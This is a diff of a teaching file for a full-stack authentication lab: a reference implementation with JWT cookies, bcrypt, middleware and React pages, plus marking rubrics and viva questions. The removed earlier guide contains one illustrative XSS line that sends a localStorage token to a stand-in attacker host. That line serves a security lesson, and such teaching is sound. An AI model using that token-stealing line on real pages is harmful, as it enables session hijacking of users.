@@ -1,318 +1,1888 @@
-# 🧑‍🏫 ShopKart TA Master Teaching & Viva Guide (Lab 02)
+Yes. This is another **student evaluation rubric**, this time for **Authentication: Registration + Login + Protected Page + Logout**.
 
-> **Audience**: Teaching Assistants (TAs), Instructors & Students  
-> **Topic**: Full-Stack Authentication (React + Express + JWT + HttpOnly Cookies)  
-> **Purpose**: A complete repository of conceptual and code-related questions to evaluate students during lab sessions, viva voce, and 1-on-1 code reviews.
+There is one formatting issue in the table: the marks appear shifted across columns. Based on the rubric text, the intended total is:
 
----
+- **Registration — 25**
+- **Login — 30**
+- **Protected Page & Logout — 15**
+- **Viva — 30**
+- **Total — 100**
 
-## 📑 Table of Contents
-
-1. [Connecting Frontend to Backend & Networking](#1-connecting-frontend-to-backend--networking)
-2. [Authentication vs Authorization](#2-authentication-vs-authorization)
-3. [HttpOnly Cookies vs LocalStorage (Security)](#3-httponly-cookies-vs-localstorage-security)
-4. [React Concepts & Form Handling](#4-react-concepts--form-handling)
-5. [JSON Web Tokens (JWT) Deep Dive](#5-json-web-tokens-jwt-deep-dive)
-6. [Protected Routes & Navigation Flow](#6-protected-routes--navigation-flow)
-7. [Password Hashing & Backend Security](#7-password-hashing--backend-security)
-8. [Error Handling & Industry Standards](#8-error-handling--industry-standards)
-9. [⚡ Rapid-Fire Viva Cheat Sheet (5-Minute Evaluation)](#9--rapid-fire-viva-cheat-sheet-5-minute-evaluation)
+Below is a **complete reference implementation** you can use for marking students, followed by **easy → medium viva questions with answers**.
 
 ---
 
-# 1. Connecting Frontend to Backend & Networking
+# 1. Recommended Project Structure
 
-### ❓ Question 1: "Why do we use an Axios instance instead of calling `axios.get('http://localhost:5001/...')` everywhere?"
+```text
+project/
+│
+├── backend/
+│   ├── models/
+│   │   └── User.js
+│   ├── routes/
+│   │   └── authRoutes.js
+│   ├── controllers/
+│   │   └── authController.js
+│   ├── middleware/
+│   │   └── authMiddleware.js
+│   ├── server.js
+│   └── .env
+│
+└── frontend/
+    └── src/
+        ├── pages/
+        │   ├── Register.jsx
+        │   ├── Login.jsx
+        │   └── Home.jsx
+        ├── App.jsx
+        └── main.jsx
+```
 
-#### 💡 Ideal Student Answer:
-> *"Creating an Axios instance with `axios.create()` allows us to centralize our API configuration in one place—such as the `baseURL`, default headers, and `withCredentials: true`. If our server URL changes or we deploy to production, we only update one file (`services/api.js`) instead of modifying dozens of components."*
+We'll use:
 
-#### 💻 Code Snippet:
-```javascript
-// ❌ BAD: Hardcoding base URL in every component
-// In Login.jsx:
-axios.post("http://localhost:5001/customers/login", data, { withCredentials: true });
-// In Home.jsx:
-axios.get("http://localhost:5001/customers/me", { withCredentials: true });
-
-// ✅ GOOD & INDUSTRY STANDARD: Centralized service (services/api.js)
-import axios from "axios";
-
-const api = axios.create({
-  baseURL: "http://localhost:5001",
-  withCredentials: true, // applied automatically to every request!
-});
-
-export default api;
+```text
+React
+Express
+MongoDB
+Mongoose
+bcryptjs
+jsonwebtoken
+cookie-parser
 ```
 
 ---
 
-### ❓ Question 2: "What is `withCredentials: true` and what happens if you forget it?"
+# 2. Backend Setup
 
-#### 💡 Ideal Student Answer:
-> *"By default, browsers do not attach cookies to cross-origin requests. `withCredentials: true` tells Axios and the browser to include our HttpOnly cookie (`token`) when sending requests to the backend, and to accept the `Set-Cookie` header sent by the server. If we forget it, requests to `/customers/me` will arrive at the backend without any cookie, causing a `401 Unauthorized` error every time."*
+Install:
 
-#### 🔍 Follow-Up Cross Question:
-> **TA**: *"Does setting `withCredentials: true` on the frontend alone make it work?"*  
-> **Student**: *"No! The backend Express server must also configure CORS with `credentials: true` and an explicit allowed origin (not `'*'`)."*
-
-```javascript
-// Backend (index.js):
-app.use(cors({
-  origin: "http://localhost:5173", // Must be specific, not wildcard '*'
-  credentials: true                // Allows cookies to cross domains/ports
-}));
+```bash
+npm install express mongoose bcryptjs jsonwebtoken cookie-parser cors dotenv
 ```
 
 ---
 
-### ❓ Question 3: "What is CORS and why does the browser block requests between port 5173 and 5001?"
+# 3. User Model
 
-#### 💡 Ideal Student Answer:
-> *"CORS stands for Cross-Origin Resource Sharing. An origin is defined by Protocol + Domain + Port (`http://localhost:5173` vs `http://localhost:5001`). Even though both are on `localhost`, different ports mean different origins. The browser enforces the Same-Origin Policy for security. The backend must send headers like `Access-Control-Allow-Origin` to grant the frontend permission."*
+### `models/User.js`
+
+```js
+const mongoose = require("mongoose");
+
+const userSchema = new mongoose.Schema(
+  {
+    fullName: {
+      type: String,
+      required: true,
+      trim: true,
+    },
+
+    email: {
+      type: String,
+      required: true,
+      unique: true,
+      trim: true,
+      lowercase: true,
+    },
+
+    password: {
+      type: String,
+      required: true,
+      minlength: 6,
+    },
+
+    phoneNumber: {
+      type: String,
+      required: true,
+      trim: true,
+    },
+  },
+  {
+    timestamps: true,
+  }
+);
+
+module.exports = mongoose.model("User", userSchema);
+```
+
+### What to check
+
+Students should have:
+
+- Full name
+- Email
+- Password
+- Phone number
+- Required validation
+- Unique email
 
 ---
 
-# 2. Authentication vs Authorization
+# 4. Registration API
 
-### ❓ Question 4: "What is the difference between Authentication and Authorization? Give a real-world example."
+A reasonable endpoint:
 
-#### 💡 Ideal Student Answer:
-> *"**Authentication** is answering: **Who are you?** (Verifying identity).  
-> **Authorization** is answering: **What are you allowed to do?** (Verifying permissions)."*
+```http
+POST /api/auth/register
+```
 
-#### 🏢 Real-World Analogy:
-> - **Authentication**: Showing your passport at the airport security counter. It proves your identity.
-> - **Authorization**: Your boarding pass showing you have a seat in *Economy*, not *First Class*. You are identified, but restricted from entering the First Class lounge.
+Request:
 
-#### 💻 Code Mapping:
-```javascript
-// 1. Authentication (routes/customer.routes.js):
-// Checks if email + password match -> issues a JWT token.
-router.post("/login", loginCustomer);
-
-// 2. Authorization (middlewares/auth.middleware.js):
-// Checks if the user holds a valid token before letting them access private data.
-router.get("/me", authMiddleware, getMyProfile);
+```json
+{
+  "fullName": "Rahul Kumar",
+  "email": "rahul@gmail.com",
+  "password": "password123",
+  "phoneNumber": "9876543210"
+}
 ```
 
 ---
 
-# 3. HttpOnly Cookies vs LocalStorage (Security)
+## `authController.js`
 
-### ❓ Question 5: "Why do we store the JWT in an `HttpOnly` cookie instead of `localStorage`?"
+```js
+const User = require("../models/User");
+const bcrypt = require("bcryptjs");
 
-#### 💡 Ideal Student Answer:
-> *"If we store a JWT in `localStorage`, it is accessible to any JavaScript running on the page via `localStorage.getItem('token')`. If a third-party npm package or an attacker injects malicious script (**XSS - Cross-Site Scripting**), they can steal the user's token.  
-> With an **HttpOnly** cookie, the browser forbids client-side JavaScript from reading `document.cookie`. The browser sends it automatically in HTTP headers, making it immune to token theft via XSS."*
+const register = async (req, res) => {
+  try {
+    const {
+      fullName,
+      email,
+      password,
+      phoneNumber,
+    } = req.body;
 
-#### 💻 Code Comparison:
-```javascript
-// ❌ VULNERABLE: Token stored in localStorage
-localStorage.setItem("token", response.data.token);
-// An attacker running XSS can simply do:
-fetch("https://attacker.com/steal?token=" + localStorage.getItem("token"));
+    // Check required fields
+    if (
+      !fullName ||
+      !email ||
+      !password ||
+      !phoneNumber
+    ) {
+      return res.status(400).json({
+        success: false,
+        message: "All fields are required",
+      });
+    }
 
-// ✅ SECURE & INDUSTRY STANDARD: Set as HttpOnly by server
-// Backend controller:
-res.cookie("token", token, {
-  httpOnly: true, // JS cannot read this!
-  maxAge: 24 * 60 * 60 * 1000, // 1 day
-  sameSite: "lax", // Protects against CSRF
-});
+    // Check if user already exists
+    const existingUser = await User.findOne({ email });
+
+    if (existingUser) {
+      return res.status(400).json({
+        success: false,
+        message: "Email already registered",
+      });
+    }
+
+    // Hash password
+    const hashedPassword = await bcrypt.hash(password, 10);
+
+    // Create user
+    const user = await User.create({
+      fullName,
+      email,
+      password: hashedPassword,
+      phoneNumber,
+    });
+
+    return res.status(201).json({
+      success: true,
+      message: "Registration successful",
+    });
+  } catch (error) {
+    return res.status(500).json({
+      success: false,
+      message: error.message,
+    });
+  }
+};
+
+module.exports = {
+  register,
+};
 ```
 
 ---
 
-### ❓ Question 6: "If JavaScript cannot read the HttpOnly cookie, how does React know what the customer's name is?"
+# 5. Registration Route
 
-#### 💡 Ideal Student Answer:
-> *"React does not read the cookie directly! Instead, when the `/home` page mounts, React calls `GET /customers/me`. The browser automatically includes the HttpOnly cookie in the HTTP request. The backend verifies the token and responds with user data (`{ fullName, email, phone }`), which React stores in component state."*
+### `routes/authRoutes.js`
+
+```js
+const express = require("express");
+
+const {
+  register,
+} = require("../controllers/authController");
+
+const router = express.Router();
+
+router.post("/register", register);
+
+module.exports = router;
+```
 
 ---
 
-# 4. React Concepts & Form Handling
+# 6. Why `bcrypt`?
 
-### ❓ Question 7: "What is a 'Controlled Component' in React? Why do we use it in forms?"
+This is a very important viva question.
 
-#### 💡 Ideal Student Answer:
-> *"A controlled component is an input element whose value is controlled by React state rather than the DOM. Its `value` is bound to a state variable, and every keystroke triggers an `onChange` handler that updates the state.  
-> We use it because React becomes the 'single source of truth', making instant validation, conditional disabling, and form resetting easy and predictable."*
+We should **never store the user's plain password** like:
 
-#### 💻 Code Snippet:
+```json
+{
+  "password": "password123"
+}
+```
+
+Instead:
+
+```text
+password123
+      ↓
+bcrypt.hash()
+      ↓
+$2b$10$......
+      ↓
+MongoDB
+```
+
+Example:
+
+```js
+const hashedPassword = await bcrypt.hash(
+  password,
+  10
+);
+```
+
+The `10` represents the bcrypt cost factor / salt rounds.
+
+---
+
+# 7. Registration Frontend
+
+### `Register.jsx`
+
 ```jsx
-// ✅ Controlled Component
-const [email, setEmail] = useState("");
+import { useState } from "react";
+import { useNavigate } from "react-router-dom";
 
+const Register = () => {
+  const navigate = useNavigate();
+
+  const [formData, setFormData] = useState({
+    fullName: "",
+    email: "",
+    password: "",
+    phoneNumber: "",
+  });
+
+  const [error, setError] = useState("");
+  const [success, setSuccess] = useState("");
+
+  const handleChange = (e) => {
+    setFormData({
+      ...formData,
+      [e.target.name]: e.target.value,
+    });
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    setError("");
+    setSuccess("");
+
+    try {
+      const response = await fetch(
+        "http://localhost:5000/api/auth/register",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(formData),
+        }
+      );
+
+      const data = await response.json();
+
+      if (!response.ok) {
+        setError(data.message);
+        return;
+      }
+
+      setSuccess("Registration successful");
+
+      navigate("/login");
+    } catch (error) {
+      setError("Something went wrong");
+    }
+  };
+
+  return (
+    <div>
+      <h1>Create Account</h1>
+
+      <form onSubmit={handleSubmit}>
+
+        <input
+          type="text"
+          name="fullName"
+          placeholder="Full Name"
+          value={formData.fullName}
+          onChange={handleChange}
+        />
+
+        <input
+          type="email"
+          name="email"
+          placeholder="Email"
+          value={formData.email}
+          onChange={handleChange}
+        />
+
+        <input
+          type="password"
+          name="password"
+          placeholder="Password"
+          value={formData.password}
+          onChange={handleChange}
+        />
+
+        <input
+          type="text"
+          name="phoneNumber"
+          placeholder="Phone Number"
+          value={formData.phoneNumber}
+          onChange={handleChange}
+        />
+
+        <button type="submit">
+          Create Account
+        </button>
+
+      </form>
+
+      {error && <p>{error}</p>}
+      {success && <p>{success}</p>}
+    </div>
+  );
+};
+
+export default Register;
+```
+
+---
+
+# 8. Registration Marks — 25
+
+For evaluation, I would break the 25 marks like this:
+
+| Requirement | Marks |
+|---|---:|
+| Full Name field | 2 |
+| Email field | 2 |
+| Password field | 2 |
+| Phone Number field | 2 |
+| Create Account button | 2 |
+| Controlled components | 5 |
+| Validation/errors | 5 |
+| API integration | 3 |
+| Redirect to login after success | 2 |
+| **Total** | **25** |
+
+---
+
+# 9. What Is a Controlled Component?
+
+Very important viva topic.
+
+This is a controlled input:
+
+```jsx
 <input
-  type="email"
-  value={email}                       // 1. State drives the UI
-  onChange={(e) => setEmail(e.target.value)} // 2. UI updates the State
+  name="email"
+  value={formData.email}
+  onChange={handleChange}
+/>
+```
+
+React controls the input's value.
+
+The state is:
+
+```js
+const [formData, setFormData] = useState({
+  email: "",
+});
+```
+
+When the user types:
+
+```text
+a
+```
+
+the state becomes:
+
+```text
+email: "a"
+```
+
+Then:
+
+```text
+React state
+    ↓
+Input value
+```
+
+---
+
+# 10. Login API
+
+Endpoint:
+
+```http
+POST /api/auth/login
+```
+
+Request:
+
+```json
+{
+  "email": "rahul@gmail.com",
+  "password": "password123"
+}
+```
+
+---
+
+## Login Controller
+
+```js
+const jwt = require("jsonwebtoken");
+
+const login = async (req, res) => {
+  try {
+    const {
+      email,
+      password,
+    } = req.body;
+
+    if (!email || !password) {
+      return res.status(400).json({
+        success: false,
+        message: "Email and password are required",
+      });
+    }
+
+    // Find user
+    const user = await User.findOne({ email });
+
+    if (!user) {
+      return res.status(401).json({
+        success: false,
+        message: "Invalid Credentials",
+      });
+    }
+
+    // Compare password
+    const isPasswordCorrect =
+      await bcrypt.compare(
+        password,
+        user.password
+      );
+
+    if (!isPasswordCorrect) {
+      return res.status(401).json({
+        success: false,
+        message: "Invalid Credentials",
+      });
+    }
+
+    // Generate JWT
+    const token = jwt.sign(
+      {
+        userId: user._id,
+      },
+      process.env.JWT_SECRET,
+      {
+        expiresIn: "1d",
+      }
+    );
+
+    // Send token as cookie
+    res.cookie("token", token, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === "production",
+      sameSite: "lax",
+      maxAge: 24 * 60 * 60 * 1000,
+    });
+
+    return res.status(200).json({
+      success: true,
+      message: "Login successful",
+    });
+
+  } catch (error) {
+    return res.status(500).json({
+      success: false,
+      message: error.message,
+    });
+  }
+};
+```
+
+Update exports:
+
+```js
+module.exports = {
+  register,
+  login,
+};
+```
+
+And route:
+
+```js
+router.post("/login", login);
+```
+
+---
+
+# 11. Why Use Cookies?
+
+The rubric specifically says:
+
+> Send credentials with cookies.
+
+The important concept is that after successful login, the server creates a JWT and sends it as a cookie:
+
+```text
+Login
+  ↓
+Email + Password
+  ↓
+Backend verifies
+  ↓
+JWT generated
+  ↓
+JWT stored in cookie
+  ↓
+Browser automatically sends cookie
+  ↓
+Protected API
+```
+
+With:
+
+```js
+httpOnly: true
+```
+
+JavaScript running in the browser cannot directly read the cookie.
+
+---
+
+# 12. Login Frontend
+
+### `Login.jsx`
+
+```jsx
+import { useState } from "react";
+import { useNavigate } from "react-router-dom";
+
+const Login = () => {
+  const navigate = useNavigate();
+
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+
+  const [error, setError] = useState("");
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    setError("");
+
+    try {
+      const response = await fetch(
+        "http://localhost:5000/api/auth/login",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          credentials: "include",
+          body: JSON.stringify({
+            email,
+            password,
+          }),
+        }
+      );
+
+      const data = await response.json();
+
+      if (!response.ok) {
+        setError("Invalid Credentials");
+        return;
+      }
+
+      navigate("/home");
+
+    } catch (error) {
+      setError("Something went wrong");
+    }
+  };
+
+  return (
+    <div>
+      <h1>Login</h1>
+
+      <form onSubmit={handleSubmit}>
+
+        <input
+          type="email"
+          placeholder="Email"
+          value={email}
+          onChange={(e) =>
+            setEmail(e.target.value)
+          }
+        />
+
+        <input
+          type="password"
+          placeholder="Password"
+          value={password}
+          onChange={(e) =>
+            setPassword(e.target.value)
+          }
+        />
+
+        <button type="submit">
+          Login
+        </button>
+
+      </form>
+
+      {error && <p>{error}</p>}
+    </div>
+  );
+};
+
+export default Login;
+```
+
+---
+
+# 13. Important: `credentials: "include"`
+
+This is likely to be asked in viva.
+
+```js
+credentials: "include"
+```
+
+tells the browser that cookies should be included in the cross-origin request.
+
+Without it, your frontend may successfully call:
+
+```http
+POST /login
+```
+
+but the browser may not send/store cookies as intended in a cross-origin setup.
+
+---
+
+# 14. CORS Configuration
+
+Because React and Express may run on different ports:
+
+```text
+React     → localhost:5173
+Express   → localhost:5000
+```
+
+configure CORS.
+
+### `server.js`
+
+```js
+const cors = require("cors");
+const cookieParser = require("cookie-parser");
+
+app.use(
+  cors({
+    origin: "http://localhost:5173",
+    credentials: true,
+  })
+);
+
+app.use(express.json());
+app.use(cookieParser());
+```
+
+The important part:
+
+```js
+credentials: true
+```
+
+must work together with:
+
+```js
+credentials: "include"
+```
+
+on the frontend.
+
+---
+
+# 15. JWT Authentication Middleware
+
+Create:
+
+### `middleware/authMiddleware.js`
+
+```js
+const jwt = require("jsonwebtoken");
+
+const authMiddleware = (req, res, next) => {
+  try {
+    const token = req.cookies.token;
+
+    if (!token) {
+      return res.status(401).json({
+        success: false,
+        message: "Unauthorized",
+      });
+    }
+
+    const decoded = jwt.verify(
+      token,
+      process.env.JWT_SECRET
+    );
+
+    req.userId = decoded.userId;
+
+    next();
+
+  } catch (error) {
+    return res.status(401).json({
+      success: false,
+      message: "Unauthorized",
+    });
+  }
+};
+
+module.exports = authMiddleware;
+```
+
+---
+
+# 16. Protected Home API
+
+Add:
+
+```js
+const getMe = async (req, res) => {
+  try {
+    const user = await User.findById(
+      req.userId
+    ).select("-password");
+
+    if (!user) {
+      return res.status(404).json({
+        success: false,
+        message: "User not found",
+      });
+    }
+
+    return res.status(200).json({
+      success: true,
+      user,
+    });
+
+  } catch (error) {
+    return res.status(500).json({
+      success: false,
+      message: error.message,
+    });
+  }
+};
+```
+
+Route:
+
+```js
+const authMiddleware = require("../middleware/authMiddleware");
+
+router.get(
+  "/me",
+  authMiddleware,
+  getMe
+);
+```
+
+Notice:
+
+```js
+authMiddleware
+```
+
+comes before:
+
+```js
+getMe
+```
+
+So the request must pass authentication first.
+
+---
+
+# 17. Protected Page
+
+### `Home.jsx`
+
+```jsx
+import { useEffect, useState } from "react";
+import { useNavigate } from "react-router-dom";
+
+const Home = () => {
+  const navigate = useNavigate();
+
+  const [user, setUser] = useState(null);
+  const [loading, setLoading] = useState(true);
+
+  useEffect(() => {
+    const fetchUser = async () => {
+      try {
+        const response = await fetch(
+          "http://localhost:5000/api/auth/me",
+          {
+            credentials: "include",
+          }
+        );
+
+        if (!response.ok) {
+          navigate("/login");
+          return;
+        }
+
+        const data = await response.json();
+
+        setUser(data.user);
+
+      } catch (error) {
+        navigate("/login");
+      } finally {
+        setLoading(false);
+      }
+    };
+
+    fetchUser();
+  }, [navigate]);
+
+  if (loading) {
+    return <h2>Loading...</h2>;
+  }
+
+  if (!user) {
+    return null;
+  }
+
+  return (
+    <div>
+      <h1>
+        Welcome, {user.fullName}
+      </h1>
+
+      <p>Email: {user.email}</p>
+
+      <p>
+        Phone: {user.phoneNumber}
+      </p>
+
+      <button onClick={handleLogout}>
+        Logout
+      </button>
+    </div>
+  );
+};
+
+export default Home;
+```
+
+We need the logout function:
+
+```js
+const handleLogout = async () => {
+  try {
+    await fetch(
+      "http://localhost:5000/api/auth/logout",
+      {
+        method: "POST",
+        credentials: "include",
+      }
+    );
+
+    navigate("/login");
+
+  } catch (error) {
+    console.error(error);
+  }
+};
+```
+
+---
+
+# 18. Logout API
+
+Backend:
+
+```js
+const logout = (req, res) => {
+  res.clearCookie("token", {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === "production",
+    sameSite: "lax",
+  });
+
+  return res.status(200).json({
+    success: true,
+    message: "Logged out successfully",
+  });
+};
+```
+
+Route:
+
+```js
+router.post("/logout", logout);
+```
+
+---
+
+# 19. Complete Authentication Flow
+
+This is the **most important concept for viva**.
+
+```text
+                 REGISTRATION
+
+React Register Form
+        ↓
+POST /register
+        ↓
+Express
+        ↓
+Validate fields
+        ↓
+Check existing email
+        ↓
+bcrypt.hash(password)
+        ↓
+Save user to MongoDB
+        ↓
+201 Created
+        ↓
+Navigate → /login
+```
+
+Then:
+
+```text
+                    LOGIN
+
+React Login Form
+        ↓
+POST /login
+        ↓
+Express
+        ↓
+Find user by email
+        ↓
+bcrypt.compare()
+        ↓
+Password correct?
+      /       \
+    No         Yes
+    ↓           ↓
+401          jwt.sign()
+                ↓
+          Set Cookie
+                ↓
+             200 OK
+                ↓
+         Navigate /home
+```
+
+Then:
+
+```text
+                   PROTECTED PAGE
+
+GET /me
+   +
+Cookie: token
+      ↓
+authMiddleware
+      ↓
+jwt.verify()
+      ↓
+Extract userId
+      ↓
+Find user
+      ↓
+Return user information
+      ↓
+React displays:
+Welcome
+Name
+Email
+Phone
+```
+
+Logout:
+
+```text
+Click Logout
+     ↓
+POST /logout
+     ↓
+clearCookie("token")
+     ↓
+Navigate /login
+```
+
+---
+
+# 20. React Routes
+
+### `App.jsx`
+
+```jsx
+import {
+  BrowserRouter,
+  Routes,
+  Route,
+} from "react-router-dom";
+
+import Register from "./pages/Register";
+import Login from "./pages/Login";
+import Home from "./pages/Home";
+
+function App() {
+  return (
+    <BrowserRouter>
+      <Routes>
+
+        <Route
+          path="/register"
+          element={<Register />}
+        />
+
+        <Route
+          path="/login"
+          element={<Login />}
+        />
+
+        <Route
+          path="/home"
+          element={<Home />}
+        />
+
+      </Routes>
+    </BrowserRouter>
+  );
+}
+
+export default App;
+```
+
+---
+
+# 21. Marking Breakdown
+
+## Registration — 25
+
+| Requirement | Marks |
+|---|---:|
+| Full Name | 2 |
+| Email | 2 |
+| Password | 2 |
+| Phone Number | 2 |
+| Create Account button | 2 |
+| Controlled components | 5 |
+| Validation/error handling | 5 |
+| API integration | 3 |
+| Redirect to login | 2 |
+| **Total** | **25** |
+
+---
+
+# Login — 30
+
+| Requirement | Marks |
+|---|---:|
+| Email field | 5 |
+| Password field | 5 |
+| Login button | 5 |
+| Controlled components | 5 |
+| Send credentials/cookies | 5 |
+| Invalid Credentials handling | 3 |
+| Redirect to `/home` | 2 |
+| **Total** | **30** |
+
+---
+
+# Protected Page + Logout — 15
+
+| Requirement | Marks |
+|---|---:|
+| Protected API/page | 3 |
+| Welcome message | 2 |
+| Customer name | 2 |
+| Email | 2 |
+| Phone number | 2 |
+| Logout button/function | 2 |
+| Cookie cleared | 1 |
+| Redirect to login | 1 |
+| **Total** | **15** |
+
+---
+
+# Viva — 30
+
+I'd ask **6 questions × 5 marks** or **10 questions × 3 marks**, depending on your evaluation style.
+
+Below is a large question bank.
+
+---
+
+# 🟢 EASY VIVA
+
+### 1. What is authentication?
+
+**Answer:**
+
+Authentication is the process of verifying the identity of a user.
+
+For example:
+
+```text
+Email + Password
+       ↓
+Verify user
+       ↓
+Authenticated
+```
+
+---
+
+### 2. What is authorization?
+
+**Answer:**
+
+Authorization determines what an authenticated user is allowed to access.
+
+Example:
+
+```text
+Authentication:
+"Who are you?"
+
+Authorization:
+"What are you allowed to access?"
+```
+
+---
+
+### 3. Why do we hash passwords?
+
+**Answer:**
+
+We hash passwords so that the original password is not stored directly in the database.
+
+Instead of:
+
+```text
+password123
+```
+
+we store a bcrypt hash.
+
+---
+
+### 4. What is bcrypt?
+
+**Answer:**
+
+bcrypt is a password-hashing library commonly used to securely hash passwords and compare passwords during login.
+
+---
+
+### 5. What is JWT?
+
+**Answer:**
+
+JWT stands for **JSON Web Token**. It is a signed token that can represent information about an authenticated user.
+
+---
+
+### 6. What is a cookie?
+
+**Answer:**
+
+A cookie is a small piece of data stored by the browser and associated with a website. It can be sent automatically with requests to that website.
+
+---
+
+### 7. What is `httpOnly`?
+
+```js
+httpOnly: true
+```
+
+**Answer:**
+
+It prevents client-side JavaScript from directly accessing the cookie.
+
+This can help reduce the impact of certain XSS attacks involving cookie theft.
+
+---
+
+### 8. What is `req.body`?
+
+**Answer:**
+
+It contains data sent by the client in the request body.
+
+Example:
+
+```js
+req.body.email
+```
+
+---
+
+### 9. What is `req.cookies`?
+
+**Answer:**
+
+It contains cookies sent by the browser, provided that `cookie-parser` middleware has been configured.
+
+```js
+req.cookies.token
+```
+
+---
+
+### 10. Why do we use `cookie-parser`?
+
+**Answer:**
+
+It parses cookies from incoming HTTP requests and makes them accessible through:
+
+```js
+req.cookies
+```
+
+---
+
+# 🟡 EASY-MEDIUM
+
+### 11. What is a controlled component?
+
+**Answer:**
+
+A controlled component is a form input whose value is controlled by React state.
+
+Example:
+
+```jsx
+<input
+  value={email}
+  onChange={(e) =>
+    setEmail(e.target.value)
+  }
 />
 ```
 
 ---
 
-### ❓ Question 8: "Why should we validate form inputs on BOTH client and server?"
+### 12. Why use `preventDefault()`?
 
-#### 💡 Ideal Student Answer:
-> *"**Client-side validation** provides immediate user feedback (e.g. 'Password must be at least 6 characters') without waiting for a network roundtrip.  
-> **Server-side validation** is mandatory for security because any attacker can bypass the frontend using Postman, curl, or browser dev tools."*
+```js
+e.preventDefault();
+```
 
----
+**Answer:**
 
-# 5. JSON Web Tokens (JWT) Deep Dive
-
-### ❓ Question 9: "What are the three parts of a JWT? Can someone decode a JWT to read its data?"
-
-#### 💡 Ideal Student Answer:
-> *"A JWT consists of three parts separated by dots:  
-> `Header.Payload.Signature`  
-> 1. **Header**: Contains the token type (JWT) and algorithm (e.g. HS256).  
-> 2. **Payload**: Contains claims/data (like user `id`, expiration time).  
-> 3. **Signature**: Cryptographic hash created using `secret_key + header + payload`.  
->  
-> **Yes! Anyone can decode the payload** because it is only Base64-encoded, not encrypted. Therefore, **we must NEVER store sensitive data like passwords inside the JWT payload!**"*
-
-#### 🔍 Follow-Up Cross Question:
-> **TA**: *"If anyone can read the payload, how does the server know it wasn't modified (e.g. changing userId to admin)?"*  
-> **Student**: *"Because of the **Signature**! If someone changes even one character in the payload, the signature will not match when verified with the server's secret key (`jwt.verify`), and the server will reject it."*
+It prevents the browser's default form submission behavior, allowing React to handle the submission through JavaScript.
 
 ---
 
-# 6. Protected Routes & Navigation Flow
+### 13. Why do we use `credentials: "include"`?
 
-### ❓ Question 10: "Explain the lifecycle of what happens when a user navigates to `/home`."
+**Answer:**
+
+It tells the browser to include credentials such as cookies with the request, particularly when making cross-origin requests.
+
+---
+
+### 14. Why is `credentials: true` required in CORS?
+
+```js
+cors({
+  origin: "http://localhost:5173",
+  credentials: true
+})
+```
+
+**Answer:**
+
+It allows the server to accept credentialed cross-origin requests, including cookies.
+
+---
+
+### 15. Why do we need both?
+
+Frontend:
+
+```js
+credentials: "include"
+```
+
+Backend:
+
+```js
+credentials: true
+```
+
+**Answer:**
+
+The frontend requests that credentials/cookies be included, while the backend CORS configuration allows credentialed cross-origin requests.
+
+Both sides need to be configured appropriately.
+
+---
+
+### 16. What does `bcrypt.compare()` do?
+
+```js
+bcrypt.compare(password, user.password)
+```
+
+**Answer:**
+
+It compares the plain password entered during login against the stored bcrypt hash without needing to decrypt the hash.
+
+---
+
+### 17. Can bcrypt decrypt a password?
+
+**Answer:**
+
+No. bcrypt is a one-way password hashing mechanism. During login, `bcrypt.compare()` checks whether the supplied password corresponds to the stored hash.
+
+---
+
+### 18. Why don't we store the JWT in the database?
+
+**Answer:**
+
+In a typical JWT-based authentication design, the server can verify the token cryptographically using the signing secret without needing to store every token in the database.
+
+---
+
+### 19. What does `jwt.sign()` do?
+
+```js
+jwt.sign(
+  { userId: user._id },
+  process.env.JWT_SECRET
+);
+```
+
+**Answer:**
+
+It creates a signed JWT containing the specified payload.
+
+---
+
+### 20. What does `jwt.verify()` do?
+
+```js
+jwt.verify(token, process.env.JWT_SECRET);
+```
+
+**Answer:**
+
+It verifies that the token is valid and was signed with the expected secret. If valid, it returns the decoded payload.
+
+---
+
+# 🟠 MEDIUM
+
+### 21. Explain the login flow.
+
+**Expected answer:**
+
+> The frontend sends the email and password to the login API. The backend finds the user by email, compares the supplied password with the stored bcrypt hash, and if they match, generates a JWT. The JWT is sent as an HTTP cookie. The frontend then navigates to the protected home page.
+
+---
+
+### 22. How does the server know which user is logged in?
+
+**Answer:**
+
+The JWT contains information such as the user's ID:
+
+```js
+{
+  userId: user._id
+}
+```
+
+The authentication middleware verifies the token and extracts that ID.
+
+```js
+req.userId = decoded.userId;
+```
+
+---
+
+### 23. What happens if there is no token?
+
+**Answer:**
+
+The authentication middleware rejects the request.
+
+For example:
+
+```js
+if (!token) {
+  return res.status(401).json({
+    message: "Unauthorized"
+  });
+}
+```
+
+---
+
+### 24. What happens if the JWT is invalid?
+
+**Answer:**
+
+`jwt.verify()` throws an error, which should be caught and the server should return an authentication error such as `401 Unauthorized`.
+
+---
+
+### 25. Why is `/me` protected?
+
+**Answer:**
+
+Because it returns information belonging to the authenticated user. The authentication middleware ensures that only an authenticated user can access it.
+
+---
+
+### 26. What is middleware?
+
+**Answer:**
+
+Middleware is a function that runs during the Express request-response cycle.
+
+Example:
+
+```js
+router.get(
+  "/me",
+  authMiddleware,
+  getMe
+);
+```
+
+The request must pass `authMiddleware` before reaching `getMe`.
+
+---
+
+### 27. What does `next()` do?
+
+```js
+next();
+```
+
+**Answer:**
+
+It passes control from the current middleware to the next middleware or route handler.
+
+---
+
+### 28. Why do we use `select("-password")`?
+
+```js
+User.findById(req.userId)
+  .select("-password");
+```
+
+**Answer:**
+
+It excludes the password field from the returned user document so that the hashed password isn't unnecessarily sent to the client.
+
+---
+
+### 29. Why return 401 for invalid credentials?
+
+**Answer:**
+
+`401 Unauthorized` indicates that authentication failed or valid authentication credentials were not provided.
+
+---
+
+### 30. What happens after logout?
+
+**Answer:**
+
+The server clears the authentication cookie:
+
+```js
+res.clearCookie("token");
+```
+
+Then the frontend redirects the user to:
 
 ```text
-Browser enters /home
-        │
-        ▼
-Is there a user profile in state?
-        │
-        ├── No ──> Show Loading Spinner
-        │               │
-        │               ▼
-        │          api.get("/customers/me")
-        │               │
-        │         ┌─────┴─────┐
-        │         ▼           ▼
-        │     200 OK       401 Unauthorized
-        │         │           │
-        │         ▼           ▼
-        │     Set State   navigate("/login")
-        │         │
-        └───> Render Profile Dashboard
-```
-
-#### 💻 Code Snippet:
-```jsx
-// Home.jsx:
-useEffect(() => {
